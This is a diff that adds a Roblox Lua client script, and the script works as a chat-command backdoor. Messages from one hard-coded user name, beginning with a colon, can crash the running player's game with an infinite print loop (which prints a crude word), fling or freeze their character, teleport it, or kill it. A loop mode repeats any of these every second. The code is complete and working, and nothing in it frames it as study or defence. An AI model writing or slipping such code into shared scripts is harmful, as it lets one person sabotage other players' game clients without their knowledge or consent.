@@ -1,0 +1,137 @@
+local TextChatService = game:GetService("TextChatService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local AdminList = { "Diwno2ff" }
+
+local Loops = {}
+
+local cmds = {}
+
+cmds["crash"] = function()
+    while true do
+        print("Penis")
+    end
+end
+
+cmds["kick"] = function(_, _)
+    if LocalPlayer.Character then
+        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            hrp.CFrame = CFrame.new(0, 99999999, 0)
+            task.wait(0.3)
+            hrp.Anchored = true
+        end
+        LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = math.huge
+        LocalPlayer.CharacterAdded:Connect(function(char)
+            local newHum = char:WaitForChild("Humanoid")
+            newHum.Health = math.huge
+        end)
+    end
+end
+
+cmds["bring"] = function(Admin)
+    if LocalPlayer.Character and Admin.Character then
+        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        local adminHrp = Admin.Character:FindFirstChild("HumanoidRootPart")
+        if hrp and adminHrp then
+            hrp.CFrame = adminHrp.CFrame
+        end
+    end
+end
+
+cmds["kill"] = function()
+    if LocalPlayer.Character then
+        local hum = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
+        if hum then
+            hum.Health = 0
+        end
+    end
+end
+
+local function isAdminListed(playerName)
+    for _, name in ipairs(AdminList) do
+        if name:lower() == playerName:lower() then
+            return true
+        end
+    end
+    return false
+end
+
+local function FindMatch(Name)
+    Name = Name:lower()
+    for _, Player in Players:GetPlayers() do
+        if Player.Name:lower():sub(1, #Name) == Name then
+            return Player
+        end
+    end
+    return nil
+end
+
+local function StartLoop(command, sender, data)
+    if Loops[command] then return end
+    Loops[command] = true
+    task.spawn(function()
+        while Loops[command] do
+            pcall(function()
+                cmds[command](sender, data)
+            end)
+            task.wait(1)
+        end
+    end)
+end
+
+local function StopLoop(command)
+    Loops[command] = nil
+end
+
+TextChatService.OnIncomingMessage = function(message)
+    local sender = message.TextSource
+    if not sender then return end
+
+    local senderName = sender.Name
+    if not isAdminListed(senderName) then return end
+
+    local lowerMsg = message.Text:lower()
+    if string.sub(lowerMsg, 1, 1) == ":" then
+        local args = string.split(string.sub(lowerMsg, 2), " ")
+        if #args == 0 then return end
+
+        local Command = table.remove(args, 1)
+        local TargetName = args[1] or ""
+        local Data = table.concat(args, " ", 2)
+
+        local isLoop = false
+        if Command:sub(1,4) == "loop" then
+            isLoop = true
+            Command = Command:sub(5)
+        elseif TargetName:lower() == "-loop" then
+            isLoop = true
+            TargetName = table.remove(args,1) or ""
+            Data = table.concat(args, " ", 2)
+        elseif Command:sub(1,6) == "unloop" then
+            local unloopCmd = Command:sub(7)
+            StopLoop(unloopCmd)
+            return
+        end
+
+        Command = Command:lower()
+        if cmds[Command] then
+            local Target
+            if TargetName == "@s" or TargetName:lower() == LocalPlayer.Name:lower() then
+                Target = LocalPlayer
+            else
+                Target = FindMatch(TargetName)
+            end
+
+            if TargetName == "all" or Target == LocalPlayer then
+                if isLoop then
+                    StartLoop(Command, sender, Data)
+                else
+                    pcall(function()
+                        cmds[Command](sender, Data)
+                    end)
+                end
+            end
+        end
+    end
+end
